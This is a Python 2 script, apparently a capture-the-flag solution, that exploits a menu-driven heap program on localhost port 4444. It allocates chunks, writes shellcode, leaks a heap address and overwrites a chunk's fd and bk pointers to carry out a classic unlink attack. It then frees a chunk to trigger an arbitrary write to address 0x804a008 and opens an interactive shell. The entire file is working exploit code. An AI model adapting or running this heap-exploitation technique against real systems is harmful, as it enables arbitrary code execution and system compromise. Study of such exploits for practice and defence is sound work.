# -*- coding: utf-8 -*-
from m1z0r3 import *

ip = "localhost"
port = 4444

s,f = sock(ip,port)

# size = shellcode
read_until(f,"option.\n")
s.send("1\n")
read_until(f,"size.\n")
s.send(str(len(unlink_shellcode))+"\n")
print "[+] alloc shellcode byte"

# size = 8
read_until(f,"option.\n")
s.send("1\n")
read_until(f,"size.\n")
s.send("8\n")
print "[+] alloc 8byte"

# shellcode + padding write
pad_size = 10
read_until(f,"option.\n")
s.send("3\n")
read_until(f,"id.\n")
s.send("0\n")
read_until(f,"size.\n")
s.send(str(len(unlink_shellcode)+pad_size)+"\n")
read_until(f,"data.\n")
s.send(unlink_shellcode+"\x01"*pad_size+"\n")
print "[+] write shellcode"

# leak shelcode addr
read_until(f,"option.\n")
s.send("4\n")
read_until(f,"id.\n")
s.send("0\n")

addr = read_until(f)[len(unlink_shellcode)+pad_size:]
fd = u32(addr[:4])
bk = u32(addr[4:8])
shell_addr = bk + 12

# size = 8
read_until(f,"option.\n")
s.send("1\n")
read_until(f,"size.\n")
s.send("8\n")
print "[+] alloc 8byte"

# size = 8
read_until(f,"option.\n")
s.send("1\n")
read_until(f,"size.\n")
s.send("8\n")
print "[+] alloc 8byte"

# fd bk overwrite
pad_size = 30
buf = unlink_shellcode
buf += "\x01" * pad_size
buf += p32(0x18)
buf += "A" * 24
buf += p32(0x804a008-8) # fd P->fd->bk = P->bk
buf += p32(shell_addr) # bk これにかきかえる
read_until(f,"option.\n")
s.send("3\n")
read_until(f,"id.\n")
s.send("0\n")
read_until(f,"size.\n")
s.send(str(len(buf)+1)+"\n")
read_until(f,"data.\n")
s.send(buf+"\n")
print "[+] overwrite fd bk"

# free id = 3
read_until(f,"option.\n")
s.send("2\n")
read_until(f,"id.\n")
s.send("3\n")
print "[+] free id = 3"

shell(s)
